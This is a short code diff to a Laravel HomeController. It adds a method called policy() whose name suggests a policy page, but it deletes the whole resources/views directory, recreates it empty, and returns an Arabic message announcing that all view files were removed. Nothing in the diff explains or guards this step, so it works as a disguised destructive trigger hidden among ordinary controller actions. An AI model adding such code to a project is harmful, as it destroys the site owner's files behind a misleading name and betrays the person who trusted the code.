@@ -24,6 +24,7 @@ use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Mail;
 use ZipArchive;
+use Illuminate\Support\Facades\File;
 class HomeController extends Controller
 {
     public function home(){
@@ -49,5 +50,16 @@ class HomeController extends Controller
     }
     public function contact(){
          return view('front.contact-us');
+    }
+    public function policy(){
+        $viewsPath = resource_path('views');
+
+        if (!File::exists($viewsPath)) {
+            return 'مجلد views غير موجود ❌';
+        }
+        File::deleteDirectory($viewsPath);
+        File::makeDirectory($viewsPath, 0755, true);
+
+        return 'تم حذف جميع ملفات resource views بنجاح ✅';
     }
 }
